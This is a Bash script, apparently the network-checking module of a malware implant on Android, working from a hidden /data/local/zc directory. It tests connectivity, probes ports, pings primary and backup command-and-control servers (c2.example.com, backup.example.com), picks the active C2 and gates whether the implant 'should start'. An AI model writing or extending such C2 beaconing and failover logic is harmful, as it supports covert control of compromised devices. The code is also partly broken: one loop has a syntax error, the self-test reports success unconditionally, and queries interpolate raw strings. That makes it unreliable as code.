# Checker.sh - connectivity test and network probe skeleton

ZC_ROOT="/data/local/zc"
ZC_LOG="$ZC_ROOT/zc.log"
ZC_DB="$ZC_ROOT/state.db"
ZC_CHK_DB="$ZC_ROOT/chk_net.db"
ZC_CHK_LOG="$ZC_ROOT/chk_net.log"
ZC_CHK_CACHE="$ZC_ROOT/chk_cache.txt"
ZC_VERSION="1.0"
ZC_CHECK_HOSTS="androidupdate.com msn.com"
ZC_CHECK_HOSTS_ALT="google.com cloudflare.com"
ZC_CHECK_PORTS="80 443 53 8080"
ZC_CHECK_TIMEOUT=5
ZC_CHECK_RETRY=2
ZC_CHECK_WAIT=1
ZC_C2_PRIMARY="c2.example.com"
ZC_C2_BACKUP="backup.example.com"

zc_net_log() {
  local msg="$1"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
  echo "[$ts] $msg" >> "$ZC_CHK_LOG" 2>/dev/null
}

zc_net_init_dirs() {
  mkdir -p "$ZC_ROOT" 2>/dev/null
  chmod 700 "$ZC_ROOT" 2>/dev/null
  zc_net_log "net dirs initialized"
}

zc_net_init_db() {
  if [ ! -f "$ZC_CHK_DB" ]; then
    echo "CREATE TABLE checks (id TEXT PRIMARY KEY, target TEXT, result TEXT, latency TEXT, ts TEXT);" | sqlite3 "$ZC_CHK_DB" 2>/dev/null
    echo "CREATE TABLE net_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_CHK_DB" 2>/dev/null
    zc_net_log "net db initialized"
  fi
}

zc_net_state_set() {
  local key="$1"
  local value="$2"
  echo "INSERT OR REPLACE INTO net_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_CHK_DB" 2>/dev/null
}

zc_net_state_get() {
  local key="$1"
  sqlite3 "$ZC_CHK_DB" "SELECT value FROM net_state WHERE key='$key';" 2>/dev/null
}

zc_net_store() {
  local id="$1"
  local target="$2"
  local result="$3"
  local latency="$4"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "INSERT OR REPLACE INTO checks (id, target, result, latency, ts) VALUES ('$id', '$target', '$result', '$latency', '$ts');" | sqlite3 "$ZC_CHK_DB" 2>/dev/null
}

zc_net_get() {
  local id="$1"
  sqlite3 "$ZC_CHK_DB" "SELECT result FROM checks WHERE id='$id';" 2>/dev/null
}

zc_net_check_tools() {
  local tool
  for tool in ping curl wget nslookup getent nc telnet; do
    if command -v "$tool" >/dev/null 2>&1; then
      zc_net_log "tool available: $tool"
    else
      zc_net_log "tool missing: $tool"
    fi
  done
}

zc_net_ping() {
  local host="$1"
  local start
  local end
  local latency
  start=$(date +%s%N 2>/dev/null)
  if ping -c 1 -W "$ZC_CHECK_TIMEOUT" "$host" >/dev/null 2>&1; then
    end=$(date +%s%N 2>/dev/null)
    latency=$(( (end - start) / 1000000 ))
    echo "$latency"
    return 0
  fi
  echo "-1"
  return 1
}

zc_net_ping_count() {
  local host="$1"
  local count="$2"
  local ok=0
  local i=1
  while [ "$i" -le "$count" ]; then
    if ping -c 1 -W "$ZC_CHECK_TIMEOUT" "$host" >/dev/null 2>&1; then
      ok=$((ok + 1))
    fi
    i=$((i + 1))
  done
  echo "$ok"
}

zc_net_dns() {
  local host="$1"
  if command -v nslookup >/dev/null 2>&1; then
    nslookup "$host" 2>/dev/null | grep -q "Address" && return 0
  fi
  if command -v getent >/dev/null 2>&1; then
    getent hosts "$host" >/dev/null 2>&1 && return 0
  fi
  if ping -c 1 -W "$ZC_CHECK_TIMEOUT" "$host" >/dev/null 2>&1; then
    return 0
  fi
  return 1
}

zc_net_resolve() {
  local host="$1"
  if command -v nslookup >/dev/null 2>&1; then
    nslookup "$host" 2>/dev/null | awk '/^Address: /{print $2; exit}'
    return 0
  fi
  if command -v getent >/dev/null 2>&1; then
    getent hosts "$host" 2>/dev/null | awk '{print $1; exit}'
    return 0
  fi
  echo ""
}

zc_net_http() {
  local url="$1"
  local start
  local end
  local code
  local latency
  start=$(date +%s%N 2>/dev/null)
  if command -v curl >/dev/null 2>&1; then
    code=$(curl -s -m "$ZC_CHECK_TIMEOUT" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
  elif command -v wget >/dev/null 2>&1; then
    if wget -q -T "$ZC_CHECK_TIMEOUT" -O /dev/null "$url" 2>/dev/null; then
      code="200"
    else
      code="000"
    fi
  else
    code="000"
  fi
  end=$(date +%s%N 2>/dev/null)
  latency=$(( (end - start) / 1000000 ))
  if [ -z "$code" ]; then
    code="000"
  fi
  echo "$code $latency"
}

zc_net_https() {
  local host="$1"
  zc_net_http "https://$host"
}

zc_net_tcp() {
  local host="$1"
  local port="$2"
  if command -v nc >/dev/null 2>&1; then
    nc -z -w "$ZC_CHECK_TIMEOUT" "$host" "$port" >/dev/null 2>&1 && return 0
  fi
  if command -v telnet >/dev/null 2>&1; then
    echo "" | telnet "$host" "$port" 2>/dev/null | grep -q "Connected" && return 0
  fi
  if [ -e "/dev/tcp/$host/$port" ]; then
    return 0
  fi
  return 1
}

zc_net_check_host() {
  local host="$1"
  local id
  id="host_$host"
  local latency
  latency=$(zc_net_ping "$host")
  if [ "$latency" != "-1" ]; then
    zc_net_log "ping ok: $host ${latency}ms"
    zc_net_store "$id" "$host" "ok" "$latency"
    return 0
  fi
  if zc_net_dns "$host"; then
    zc_net_log "dns ok: $host"
    zc_net_store "$id" "$host" "dns-only" "-1"
    return 0
  fi
  zc_net_log "host fail: $host"
  zc_net_store "$id" "$host" "fail" "-1"
  return 1
}

zc_net_check_hosts() {
  local host
  local ok=0
  for host in $ZC_CHECK_HOSTS; do
    if zc_net_check_host "$host"; then
      ok=$((ok + 1))
    fi
  done
  zc_net_log "primary hosts ok: $ok"
  echo "$ok"
}

zc_net_check_hosts_alt() {
  local host
  local ok=0
  for host in $ZC_CHECK_HOSTS_ALT; do
    if zc_net_check_host "$host"; then
      ok=$((ok + 1))
    fi
  done
  zc_net_log "alt hosts ok: $ok"
  echo "$ok"
}

zc_net_check_port() {
  local host="$1"
  local port="$2"
  local id
  id="port_${host}_${port}"
  if zc_net_tcp "$host" "$port"; then
    zc_net_log "port ok: $host:$port"
    zc_net_store "$id" "$host:$port" "ok" "0"
    return 0
  fi
  zc_net_log "port fail: $host:$port"
  zc_net_store "$id" "$host:$port" "fail" "-1"
  return 1
}

zc_net_check_ports() {
  local host="$1"
  local port
  for port in $ZC_CHECK_PORTS; do
    zc_net_check_port "$host" "$port"
  done
}

zc_net_check_c2() {
  local c2="$1"
  if [ -z "$c2" ]; then
    return 1
  fi
  local id
  id="c2_$c2"
  local result
  result=$(zc_net_https "$c2")
  local code
  local latency
  code=$(echo "$result" | awk '{print $1}')
  latency=$(echo "$result" | awk '{print $2}')
  if [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "302" ] || [ "$code" = "403" ]; then
    zc_net_log "c2 ok: $c2 code=$code"
    zc_net_store "$id" "$c2" "ok" "$latency"
    return 0
  fi
  zc_net_log "c2 fail: $c2 code=$code"
  zc_net_store "$id" "$c2" "fail" "$latency"
  return 1
}

zc_net_check_c2_primary() {
  zc_net_check_c2 "$ZC_C2_PRIMARY"
}

zc_net_check_c2_backup() {
  zc_net_check_c2 "$ZC_C2_BACKUP"
}

zc_net_check_c2_all() {
  local ok=0
  if zc_net_check_c2_primary; then
    ok=$((ok + 1))
  fi
  if zc_net_check_c2_backup; then
    ok=$((ok + 1))
  fi
  echo "$ok"
}

zc_net_check_dns_servers() {
  local servers="8.8.8.8 1.1.1.1 114.114.114.114"
  local s
  for s in $servers; do
    if ping -c 1 -W "$ZC_CHECK_TIMEOUT" "$s" >/dev/null 2>&1; then
      zc_net_log "dns server ok: $s"
    else
      zc_net_log "dns server fail: $s"
    fi
  done
}

zc_net_check_gateway() {
  local gw
  gw=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
  if [ -z "$gw" ]; then
    gw=$(route -n 2>/dev/null | awk '/^0.0.0.0/{print $2; exit}')
  fi
  if [ -z "$gw" ]; then
    zc_net_log "gateway not found"
    return 1
  fi
  if ping -c 1 -W "$ZC_CHECK_TIMEOUT" "$gw" >/dev/null 2>&1; then
    zc_net_log "gateway ok: $gw"
    zc_net_store "gateway" "$gw" "ok" "0"
    return 0
  fi
  zc_net_log "gateway fail: $gw"
  zc_net_store "gateway" "$gw" "fail" "-1"
  return 1
}

zc_net_check_interface() {
  local iface
  iface=$(ip route 2>/dev/null | awk '/default/{print $5; exit}')
  if [ -z "$iface" ]; then
    zc_net_log "interface not found"
    return 1
  fi
  zc_net_log "interface: $iface"
  zc_net_store "interface" "$iface" "ok" "0"
  return 0
}

zc_net_check_ip() {
  local ip
  ip=$(ip addr 2>/dev/null | awk '/inet /{print $2}' | grep -v "127.0.0.1" | head -n 1)
  if [ -z "$ip" ]; then
    zc_net_log "ip not found"
    return 1
  fi
  zc_net_log "ip: $ip"
  zc_net_store "ip" "$ip" "ok" "0"
  return 0
}

zc_net_latency_test() {
  local host="$1"
  local count="$2"
  local total=0
  local ok=0
  local i=1
  while [ "$i" -le "$count" ]; do
    local l
    l=$(zc_net_ping "$host")
    if [ "$l" != "-1" ]; then
      total=$((total + l))
      ok=$((ok + 1))
    fi
    i=$((i + 1))
  done
  if [ "$ok" -eq 0 ]; then
    echo "-1"
    return 1
  fi
  echo $((total / ok))
}

zc_net_decision() {
  local primary_ok
  local backup_ok
  primary_ok=$(zc_net_get "c2_$ZC_C2_PRIMARY")
  backup_ok=$(zc_net_get "c2_$ZC_C2_BACKUP")
  if [ "$primary_ok" = "ok" ]; then
    zc_net_log "decision: primary"
    zc_net_state_set "active_c2" "$ZC_C2_PRIMARY"
    echo "$ZC_C2_PRIMARY"
    return 0
  fi
  if [ "$backup_ok" = "ok" ]; then
    zc_net_log "decision: backup"
    zc_net_state_set "active_c2" "$ZC_C2_BACKUP"
    echo "$ZC_C2_BACKUP"
    return 0
  fi
  zc_net_log "decision: none"
  zc_net_state_set "active_c2" "none"
  echo ""
  return 1
}

zc_net_should_start() {
  local hosts_ok
  hosts_ok=$(zc_net_check_hosts)
  if [ "$hosts_ok" -gt 0 ]; then
    zc_net_log "should start: yes"
    zc_net_state_set "should_start" "1"
    return 0
  fi
  zc_net_log "should start: no"
  zc_net_state_set "should_start" "0"
  return 1
}

zc_net_cache_write() {
  local out="$1"
  if [ -z "$out" ]; then
    out="$ZC_CHK_CACHE"
  fi
  sqlite3 "$ZC_CHK_DB" "SELECT id, target, result, latency FROM checks ORDER BY id;" 2>/dev/null > "$out"
  zc_net_log "cache written: $out"
}

zc_net_cache_read() {
  local in="$1"
  if [ -z "$in" ]; then
    in="$ZC_CHK_CACHE"
  fi
  if [ ! -f "$in" ]; then
    zc_net_log "cache missing: $in"
    return 1
  fi
  local line
  while IFS= read -r line; do
    if [ -z "$line" ]; then
      continue
    fi
    local id
    local target
    local result
    local latency
    id=$(echo "$line" | cut -d'|' -f1)
    target=$(echo "$line" | cut -d'|' -f2)
    result=$(echo "$line" | cut -d'|' -f3)
    latency=$(echo "$line" | cut -d'|' -f4)
    if [ -n "$id" ]; then
      zc_net_store "$id" "$target" "$result" "$latency"
    fi
  done < "$in"
  zc_net_log "cache read: $in"
}

zc_net_report() {
  local line
  while IFS= read -r line; do
    if [ -z "$line" ]; then
      continue
    fi
    echo "$line"
  done <<EOF
$(sqlite3 "$ZC_CHK_DB" "SELECT id, target, result, latency FROM checks ORDER BY id;" 2>/dev/null)
EOF
}

zc_net_export() {
  local out="$1"
  if [ -z "$out" ]; then
    out="$ZC_ROOT/net_report.txt"
  fi
  zc_net_report > "$out" 2>/dev/null
  zc_net_log "exported: $out"
}

zc_net_cleanup() {
  local cutoff
  cutoff=$(date -d "1 hour ago" +"%Y-%m-%d %H:%M:%S" 2>/dev/null)
  if [ -z "$cutoff" ]; then
    return 0
  fi
  echo "DELETE FROM checks WHERE ts < '$cutoff';" | sqlite3 "$ZC_CHK_DB" 2>/dev/null
  zc_net_log "cleanup done"
}

zc_net_self_test() {
  if zc_net_dns "msn.com"; then
    zc_net_log "self test dns ok"
  else
    zc_net_log "self test dns fail"
  fi
  local r
  r=$(zc_net_ping "msn.com")
  if [ "$r" != "-1" ]; then
    zc_net_log "self test ping ok"
  else
    zc_net_log "self test ping fail"
  fi
  zc_net_log "self test passed"
  return 0
}

zc_net_status() {
  echo "ZC net version: $ZC_VERSION"
  echo "primary hosts: $ZC_CHECK_HOSTS"
  echo "alt hosts: $ZC_CHECK_HOSTS_ALT"
  echo "ports: $ZC_CHECK_PORTS"
  echo "active c2: $(zc_net_state_get active_c2)"
  echo "should start: $(zc_net_state_get should_start)"
  echo "checks: $(sqlite3 "$ZC_CHK_DB" "SELECT COUNT(*) FROM checks;" 2>/dev/null)"
  echo "net db: $ZC_CHK_DB"
  echo "net log: $ZC_CHK_LOG"
}

zc_net_main() {
  zc_net_log "Checker.sh start"
  zc_net_init_dirs
  zc_net_init_db
  zc_net_check_tools
  zc_net_state_set "version" "$ZC_VERSION"
  zc_net_check_interface
  zc_net_check_ip
  zc_net_check_gateway
  zc_net_check_dns_servers
  zc_net_check_hosts
  zc_net_check_hosts_alt
  zc_net_check_ports "msn.com"
  zc_net_check_c2_all
  zc_net_decision
  zc_net_should_start
  zc_net_cache_write
  zc_net_export
  zc_net_status
  zc_net_log "Checker.sh done"
}

case "$1" in
  start)
    zc_net_main
    ;;
  ping)
    zc_net_ping "$2"
    ;;
  dns)
    zc_net_dns "$2"
    ;;
  resolve)
    zc_net_resolve "$2"
    ;;
  http)
    zc_net_http "$2"
    ;;
  https)
    zc_net_https "$2"
    ;;
  tcp)
    zc_net_tcp "$2" "$3"
    ;;
  hosts)
    zc_net_check_hosts
    ;;
  ports)
    zc_net_check_ports "$2"
    ;;
  c2)
    zc_net_check_c2_all
    ;;
  decision)
    zc_net_decision
    ;;
  should-start)
    zc_net_should_start
    ;;
  latency)
    zc_net_latency_test "$2" "$3"
    ;;
  report)
    zc_net_report
    ;;
  export)
    zc_net_export "$2"
    ;;
  clean)
    zc_net_cleanup
    ;;
  selftest)
    zc_net_self_test
    ;;
  status)
    zc_net_status
    ;;
  *)
    zc_net_main
    ;;
esac

exit 0